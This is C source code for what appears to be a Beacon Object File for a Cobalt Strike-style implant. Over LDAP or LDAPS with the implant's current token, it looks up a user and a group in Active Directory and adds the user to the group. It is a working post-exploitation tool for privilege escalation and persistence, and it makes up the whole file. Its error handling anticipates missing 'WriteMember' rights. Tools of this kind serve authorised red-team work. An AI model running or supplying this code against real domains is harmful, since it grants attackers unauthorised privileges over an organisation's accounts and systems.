#include <windows.h>
#include <winldap.h>
#include "beacon.h"

DECLSPEC_IMPORT void*  WINAPI MSVCRT$malloc(size_t n);
DECLSPEC_IMPORT void   WINAPI MSVCRT$free(void* p);
DECLSPEC_IMPORT void*  WINAPI MSVCRT$memset(void* dst, int c, size_t n);
DECLSPEC_IMPORT size_t WINAPI MSVCRT$strlen(const char* s);
DECLSPEC_IMPORT char*  WINAPI MSVCRT$strcpy(char* dst, const char* src);
DECLSPEC_IMPORT int    WINAPI MSVCRT$_snprintf(char* buf, size_t n, const char* fmt, ...);

DECLSPEC_IMPORT LDAP*        WINAPI WLDAP32$ldap_init(PCHAR host, ULONG port);
DECLSPEC_IMPORT LDAP*        WINAPI WLDAP32$ldap_sslinit(PCHAR host, ULONG port, int secure);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_set_option(LDAP* ld, int opt, const void* val);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_connect(LDAP* ld, LDAP_TIMEVAL* tv);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_bind_s(LDAP* ld, PCHAR dn, PCHAR cred, ULONG method);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_search_s(LDAP* ld, PCHAR base, ULONG scope,
                                                            PCHAR filter, PCHAR* attrs,
                                                            ULONG attrsonly, LDAPMessage** res);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_count_entries(LDAP* ld, LDAPMessage* res);
DECLSPEC_IMPORT LDAPMessage* WINAPI WLDAP32$ldap_first_entry(LDAP* ld, LDAPMessage* res);
DECLSPEC_IMPORT PCHAR*       WINAPI WLDAP32$ldap_get_values(LDAP* ld, LDAPMessage* entry, PCHAR attr);
DECLSPEC_IMPORT PCHAR        WINAPI WLDAP32$ldap_get_dn(LDAP* ld, LDAPMessage* entry);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_value_free(PCHAR* vals);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_memfree(void* block);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_msgfree(LDAPMessage* res);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_modify_s(LDAP* ld, PCHAR dn, LDAPModA** mods);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$ldap_unbind_s(LDAP* ld);
DECLSPEC_IMPORT ULONG        WINAPI WLDAP32$LdapGetLastError(void);
DECLSPEC_IMPORT PCHAR        WINAPI WLDAP32$ldap_err2string(ULONG err);

#define LDAP_PORT    389
#define LDAPS_PORT   636

static char* validate(char* s) {
    if (!s || MSVCRT$strlen(s) == 0) return NULL;
    return s;
}

static char* strdup_bof(const char* s) {
    size_t len = MSVCRT$strlen(s) + 1;
    char* p = (char*)MSVCRT$malloc(len);
    if (p) MSVCRT$strcpy(p, s);
    return p;
}

static void bof_ldap_perror(const char* ctx, ULONG err) {
    PCHAR msg = WLDAP32$ldap_err2string(err);
    BeaconPrintf(CALLBACK_ERROR, "[-] %s: (0x%lx) %s", ctx, err, msg ? msg : "unknown");
}

void go(char* args, int alen) {

    datap parser;
    BeaconDataParse(&parser, args, alen);

    char* groupIdentifier  = validate(BeaconDataExtract(&parser, NULL));
    int   isGroupDN        = BeaconDataInt(&parser);
    char* memberIdentifier = validate(BeaconDataExtract(&parser, NULL));
    int   isMemberDN       = BeaconDataInt(&parser);
    char* searchOu         = validate(BeaconDataExtract(&parser, NULL));
    char* dcAddress        = validate(BeaconDataExtract(&parser, NULL));
    int   useLdaps         = BeaconDataInt(&parser);

    if (!groupIdentifier) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Group identifier is required");
        return;
    }
    if (!memberIdentifier) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Member identifier is required");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Group  : %s (%s)",
                 groupIdentifier, isGroupDN ? "DN" : "sAMAccountName");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Member : %s (%s)",
                 memberIdentifier, isMemberDN ? "DN" : "sAMAccountName");
    if (searchOu)  BeaconPrintf(CALLBACK_OUTPUT, "[*] Search OU : %s", searchOu);
    if (dcAddress) BeaconPrintf(CALLBACK_OUTPUT, "[*] Target DC : %s", dcAddress);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Transport : %s", useLdaps ? "LDAPS (636)" : "LDAP (389)");

    ULONG port = useLdaps ? LDAPS_PORT : LDAP_PORT;
    LDAP* ld   = useLdaps
                 ? WLDAP32$ldap_sslinit(dcAddress, port, 1)
                 : WLDAP32$ldap_init(dcAddress, port);

    if (!ld) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ldap_init failed (err=%lu)",
                     WLDAP32$LdapGetLastError());
        return;
    }

    ULONG ver = LDAP_VERSION3;
    WLDAP32$ldap_set_option(ld, LDAP_OPT_PROTOCOL_VERSION, &ver);


    ULONG rc = WLDAP32$ldap_connect(ld, NULL);
    if (rc != LDAP_SUCCESS) {
        bof_ldap_perror("ldap_connect", rc);
        WLDAP32$ldap_unbind_s(ld);
        return;
    }

    rc = WLDAP32$ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (rc != LDAP_SUCCESS) {
        bof_ldap_perror("ldap_bind_s", rc);
        WLDAP32$ldap_unbind_s(ld);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] LDAP bind successful");

    char* defaultNC = NULL;

    if (!isMemberDN || !isGroupDN) {
        LDAPMessage* rootRes = NULL;
        char* rootAttrs[]    = { "defaultNamingContext", NULL };

        rc = WLDAP32$ldap_search_s(ld, "", LDAP_SCOPE_BASE,
                                    "(objectClass=*)", rootAttrs, 0, &rootRes);
        if (rc != LDAP_SUCCESS) {
            bof_ldap_perror("RootDSE query", rc);
            WLDAP32$ldap_unbind_s(ld);
            return;
        }

        LDAPMessage* rootEntry = WLDAP32$ldap_first_entry(ld, rootRes);
        if (rootEntry) {
            PCHAR* vals = WLDAP32$ldap_get_values(ld, rootEntry, "defaultNamingContext");
            if (vals && vals[0]) {
                defaultNC = strdup_bof(vals[0]);
                BeaconPrintf(CALLBACK_OUTPUT, "[+] Naming context: %s", defaultNC);
                WLDAP32$ldap_value_free(vals);
            }
        }
        WLDAP32$ldap_msgfree(rootRes);

        if (!defaultNC) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Could not read defaultNamingContext");
            WLDAP32$ldap_unbind_s(ld);
            return;
        }
    }

    char* memberDN = NULL;
    char* groupDN  = NULL;
    char  filter[512];
    char* srchAttrs[] = { "distinguishedName", NULL };

    if (isMemberDN) {
        memberDN = strdup_bof(memberIdentifier);
        if (!memberDN) { BeaconPrintf(CALLBACK_ERROR, "[-] malloc failed"); goto cleanup; }
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Member DN (provided): %s", memberDN);
    } else {
        char* base = searchOu ? searchOu : defaultNC;
        MSVCRT$_snprintf(filter, sizeof(filter),
                        "(|(sAMAccountName=%s)(cn=%s))",
                        memberIdentifier, memberIdentifier);

        LDAPMessage* res = NULL;
        rc = WLDAP32$ldap_search_s(ld, base, LDAP_SCOPE_SUBTREE, filter, srchAttrs, 0, &res);
        if (rc != LDAP_SUCCESS) {
            bof_ldap_perror("member search", rc);
            goto cleanup;
        }
        if (WLDAP32$ldap_count_entries(ld, res) == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Member '%s' not found under '%s'",
                         memberIdentifier, base);
            WLDAP32$ldap_msgfree(res);
            goto cleanup;
        }
        LDAPMessage* entry = WLDAP32$ldap_first_entry(ld, res);
        PCHAR raw = WLDAP32$ldap_get_dn(ld, entry);
        if (raw) {
            memberDN = strdup_bof(raw);
            WLDAP32$ldap_memfree(raw);
        }
        WLDAP32$ldap_msgfree(res);

        if (!memberDN) { BeaconPrintf(CALLBACK_ERROR, "[-] Failed to copy member DN"); goto cleanup; }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Member DN (resolved): %s", memberDN);
    }

    if (isGroupDN) {
        groupDN = strdup_bof(groupIdentifier);
        if (!groupDN) { BeaconPrintf(CALLBACK_ERROR, "[-] malloc failed"); goto cleanup; }
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Group DN (provided): %s", groupDN);
    } else {
        char* base = searchOu ? searchOu : defaultNC;
        MSVCRT$_snprintf(filter, sizeof(filter),
                        "(|(sAMAccountName=%s)(cn=%s))",
                        groupIdentifier, groupIdentifier);

        LDAPMessage* res = NULL;
        rc = WLDAP32$ldap_search_s(ld, base, LDAP_SCOPE_SUBTREE, filter, srchAttrs, 0, &res);
        if (rc != LDAP_SUCCESS) {
            bof_ldap_perror("group search", rc);
            goto cleanup;
        }
        if (WLDAP32$ldap_count_entries(ld, res) == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Group '%s' not found under '%s'",
                         groupIdentifier, base);
            WLDAP32$ldap_msgfree(res);
            goto cleanup;
        }
        LDAPMessage* entry = WLDAP32$ldap_first_entry(ld, res);
        PCHAR raw = WLDAP32$ldap_get_dn(ld, entry);
        if (raw) {
            groupDN = strdup_bof(raw);
            WLDAP32$ldap_memfree(raw);
        }
        WLDAP32$ldap_msgfree(res);

        if (!groupDN) { BeaconPrintf(CALLBACK_ERROR, "[-] Failed to copy group DN"); goto cleanup; }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Group DN (resolved): %s", groupDN);
    }

    char* member_vals[]  = { memberDN, NULL };

    LDAPModA mod;
    MSVCRT$memset(&mod, 0, sizeof(LDAPModA));
    mod.mod_op               = LDAP_MOD_ADD;
    mod.mod_type             = "member";
    mod.mod_vals.modv_strvals = member_vals;

    LDAPModA* mods[] = { &mod, NULL };

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Sending ldap_modify_s ...");
    ULONG res = WLDAP32$ldap_modify_s(ld, groupDN, mods);

    if (res == LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] SUCCESS - member added to group");
        BeaconPrintf(CALLBACK_OUTPUT, "    Member : %s", memberDN);
        BeaconPrintf(CALLBACK_OUTPUT, "    Group  : %s", groupDN);
    } else {
        bof_ldap_perror("ldap_modify_s", res);

        switch (res) {
            case LDAP_ALREADY_EXISTS:
                BeaconPrintf(CALLBACK_ERROR, "[!] Member is already in the group");
                break;
            case LDAP_INSUFFICIENT_RIGHTS:
                BeaconPrintf(CALLBACK_ERROR, "[!] Token lacks WriteMember rights on the group");
                break;
            case LDAP_NO_SUCH_OBJECT:
                BeaconPrintf(CALLBACK_ERROR, "[!] Group or member DN does not exist in the directory");
                break;
            case LDAP_INVALID_DN_SYNTAX:
                BeaconPrintf(CALLBACK_ERROR, "[!] Invalid DN syntax - check for special characters");
                break;
            case LDAP_UNWILLING_TO_PERFORM:
                BeaconPrintf(CALLBACK_ERROR, "[!] DC refused - group may be protected or read-only");
                break;
            default:
                break;
        }
    }

cleanup:
    if (groupDN)   MSVCRT$free(groupDN);
    if (memberDN)  MSVCRT$free(memberDN);
    if (defaultNC) MSVCRT$free(defaultNC);
    WLDAP32$ldap_unbind_s(ld);
}
